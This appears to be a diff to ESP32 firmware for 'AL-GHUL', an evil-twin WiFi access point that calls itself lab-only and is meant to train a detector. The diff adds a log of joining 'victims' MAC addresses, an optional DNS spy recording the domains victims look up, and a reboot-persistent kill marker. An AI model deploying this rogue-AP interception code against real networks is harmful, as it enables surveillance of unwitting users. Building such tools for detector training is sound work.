@@ -16,10 +16,12 @@
 #include "freertos/task.h"
 #include "esp_log.h"
 #include "esp_system.h"
+#include "esp_attr.h"
 #include "esp_event.h"
 #include "esp_netif.h"
 #include "esp_wifi.h"
 #include "nvs_flash.h"
+#include "nvs.h"
 
 #include "app_config.h"
 #include "disguise.h"
@@ -29,6 +31,35 @@
 #include "serial_control.h"
 
 static const char *TAG = "al_ghul";
+
+// Reboot-persistent kill marker. The kill path sets it and resets the chip; on
+// the next boot app_main sees it and stays dark (brings up no WiFi), so the twin
+// is gone and stays gone across soft resets. It lives in RTC memory, which a
+// POWER CYCLE clears, so unplug/replug revives the board (no re-flash needed).
+RTC_NOINIT_ATTR uint32_t g_tombstone;
+#define TOMBSTONE_MAGIC 0xDEAD5AFEu
+
+// Forensic "diary": record each MAC that joins the clone into NVS as a readable
+// string, so a post-mortem flash dump recovers exactly who the twin intercepted
+// (metadata only, never payloads). Default flash encryption OFF means `strings`
+// on the dump reveals this, which is the point we are demonstrating.
+static void relaylog_record(const uint8_t *mac)
+{
+    nvs_handle_t h;
+    if (nvs_open("forensics", NVS_READWRITE, &h) != ESP_OK) return;
+    char buf[480];
+    size_t len = sizeof(buf);
+    if (nvs_get_str(h, "victims", buf, &len) != ESP_OK) buf[0] = '\0';
+    char entry[20];
+    snprintf(entry, sizeof(entry), "%02x:%02x:%02x:%02x:%02x:%02x;",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    if (strstr(buf, entry) == NULL && strlen(buf) + strlen(entry) < sizeof(buf)) {
+        strncat(buf, entry, sizeof(buf) - strlen(buf) - 1);
+        nvs_set_str(h, "victims", buf);
+        nvs_commit(h);
+    }
+    nvs_close(h);
+}
 
 static void on_wifi(void *arg, esp_event_base_t base, int32_t id, void *data)
 {
@@ -40,9 +71,12 @@ static void on_wifi(void *arg, esp_event_base_t base, int32_t id, void *data)
         ESP_LOGW(TAG, "uplink dropped, reconnecting");
         esp_wifi_connect();
         break;
-    case WIFI_EVENT_AP_STACONNECTED:
+    case WIFI_EVENT_AP_STACONNECTED: {
+        wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)data;
+        relaylog_record(e->mac);
         ESP_LOGI(TAG, "a client joined the clone");
         break;
+    }
     case WIFI_EVENT_AP_STADISCONNECTED:
         ESP_LOGI(TAG, "a client left the clone");
         break;
@@ -58,12 +92,24 @@ static void on_ip(void *arg, esp_event_base_t base, int32_t id, void *data)
         ESP_LOGI(TAG, "uplink up, IP " IPSTR, IP2STR(&e->ip_info.ip));
         // Turn on the transparent relay now that we have a working uplink.
         napt_relay_enable(wifi_twin_ap_netif());
+#if ALGHUL_DANGER_DEMO
+        // Educational demo: log every domain the victim looks up.
+        napt_relay_enable_dns_spy(wifi_twin_ap_netif(), wifi_twin_sta_netif());
+#else
         napt_relay_set_ap_dns_from_sta(wifi_twin_ap_netif(), wifi_twin_sta_netif());
+#endif
     }
 }
 
 void app_main(void)
 {
+    // If the Watcher neutralised us on a previous run, the tombstone survives the
+    // reset: stay dark, bring up no radio. A power cycle clears RTC and revives.
+    if (g_tombstone == TOMBSTONE_MAGIC) {
+        ESP_LOGW(TAG, "=== AL-GHUL is DEAD (neutralised). Staying dark. Power-cycle to revive. ===");
+        while (1) vTaskDelay(portMAX_DELAY);
+    }
+
     ESP_LOGI(TAG, "AL-GHUL starting (lab-only evil-twin for Watcher training)");
 
     esp_err_t err = nvs_flash_init();
